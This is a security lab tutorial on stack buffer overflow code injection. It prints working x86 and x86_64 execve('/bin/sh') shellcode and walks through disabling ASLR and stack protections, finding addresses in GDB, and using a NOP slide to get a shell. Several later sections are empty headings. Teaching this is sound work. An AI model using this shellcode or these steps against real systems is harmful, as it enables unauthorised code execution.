# Code Injection

Now that we understand what a buffer overflow is, what can we do with it?

## Shellcode Injection

In this lab, we will learn how to call a shellcode from within a program 
using `execve("/bin/sh", "/bin/sh", NULL)`.

You can find the following shellcodes online by searching for x86 (or x86\_64) 
shellcode. If you are on a different architecture, you can find those.

**x86**

```
"\x31\xc0"              // xor    %eax,%eax
"\x50"                  // push   %eax
"\x68\x2f\x2f\x73\x68"  // push   $0x68732f2f
"\x68\x2f\x62\x69\x6e"  // push   $0x6e69622f
"\x89\xe3"              // mov    %esp,%ebx
"\x89\xc1"              // mov    %eax,%ecx
"\x89\xc2"              // mov    %eax,%edx
"\xb0\x0b"              // mov    $0xb,%al
"\xcd\x80"              // int    $0x80
"\x31\xc0"              // xor    %eax,%eax
"\x40"                  // inc    %eax
"\xcd\x80"              // int    $0x80
```

**x86\_64**

```
"\x48\x31\xd2"                                  // xor    %rdx, %rdx
"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov $0x68732f6e69622f2f, %rbx
"\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
"\x53"                                          // push   %rbx
"\x48\x89\xe7"                                  // mov    %rsp, %rdi
"\x50"                                          // push   %rax
"\x57"                                          // push   %rdi
"\x48\x89\xe6"                                  // mov    %rsp, %rsi
"\xb0\x3b"                                      // mov    $0x3b, %al
"\x0f\x05"                                      // syscall
```

To understand how the above shellcodes work, examine the source code of 
`shellcode.c`. The program is very simple. It creates a char array that is 
loaded with the shellcode, and calls a function located at the address of the 
array. Simple, see?

Maybe that's not very clear if you haven't used function pointers before. The 
key to understand here is that the shellcode is a set of machine instructions 
that can be executed, and it is also a string that can be input. This is a 
result of one of the ideas at the core of computing. Bits are just bits, and 
there is no distinction between instructions and other data. So you can input 
instructions, and if you can direct the instruction pointer to that data the 
machine is perfectly capable of executing it.

You can compile the `shellcode.c` example as a 32-bit program and execute it 
to see the result for yourself by using the compiler flag `-m32`.

```
user@machine:$ gcc -m32 -o shellcode shellcode.c
user@machine:$ ./shellcode
$
```

The lonely `$` in the above example is the shellcode. You will have to `exit` 
to get back to your normal shell.

## Example Inject

We begin this lab by repeating the steps from the previous buffer overflow 
example. The only difference here is that instead of simple spacing 
characters, we will include the appropriate above shellcode. If you don't 
understand the following instructions, you might want to revisit the previous 
example.

1. Disable ASLR.
    - `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
2. Compile the program with the same flags as earlier.
    - `gcc -g -z execstack -fno-stack-protector -o vulntoshell vulntoshell.c`
3. Open the program with GDB.
    - `gdb vulntoshell`
4. Dissassemble the vulnerable function to find the actual size of the buffer.
    - `disassemble vulnfunc`
5. Create a breakpoint after filling the buffer, but before returning from 
the function.
6. Run the program with the shellcode as the input. 
    - You may remember that x86 is little-endian, and might be tempted to 
    input the shellcode backwards somehow. That's not neccessary here, you 
    can input the shellcode in the order shown above.
7. GDB will break and wait for input.
8. Examine the stack using `x /32x $sp`. You should see your shellcode input in 
the stack somewhere. Take note of the address where this code is. You will 
need this address.
    - You can index with relative addresses if you want to refine your search 
    by using `x /32x ($sp + 8)` or similar.
9. Run the program again with input consisting of shellcode, spacing 
characters, and the return address.
10. If you did this correctly, you should get a shell.

## ASLR: Address Space Layout Randomization

Now that we can inject a shellcode from within GDB, we have to revisit our 
previous discussion about ASLR.

Address Space Layout Randomization is a security technique designed to protect 
against buffer overflow attacks by randomly arranging the base addresses of 
data in memory. This applies to the text, heap, and stack locations discussed 
in the previous lab as well as for libraries which we will discuss more in the 
next lab.

Because of this, we can not expect to return directly to the correct address. Instead we will make use of a technique known as a NOP slide.

## NOP Slide

A NOP slide (pronounced "No-Op") is simply a large set of sequential addresses 
that are filled with instructions directing the machine not to do anything. 
When a machine executes a NOP instruction, the program counter increments 
normally but nothing else happens. This is normal operation and can continue 
for as long as the next instruction remains NOP.

The idea of creating a NOP slide is that you extend the range of addresses 
that the program can jump to and still end up at your shellcode. Returning to 
any address in the NOP slide will cause the machine to iterate through all the 
NOP instructions until it comes to the shellcode you placed at the end. This 
can give you a much greater chance that the return address you chose will be 
correct.

You can verify this before turning off ASLR by adjusting your input as 
decribed above. You can also change your return address to be somewhere in the 
middle of the NOP slide, or leave it at the top. It won't matter, as the NOP 
instructions do nothing by design.

## objdump

Before turning off ASLR, we will introduce a smaller amount of randomness to 
our tests by executing the program outside of our debugger. A debugger is a 
more development focused tool than an exploitation tool. Using it as we have 
up until now is very useful for understanding vulerabilities and creating 
secure programs as well as generally understanding the behavior of a program.

There is a different method of examining the machine instructions within 
binary and object files. The program `objdump` can be used to dissassemble 
binary files using the `-D` flag.

`objdump -D -M intel vulntoshell | grep vulnfunc.: -A20`

## Finding the Address of the Stack

## Probability

## Environmental Variables

## Closing Notes
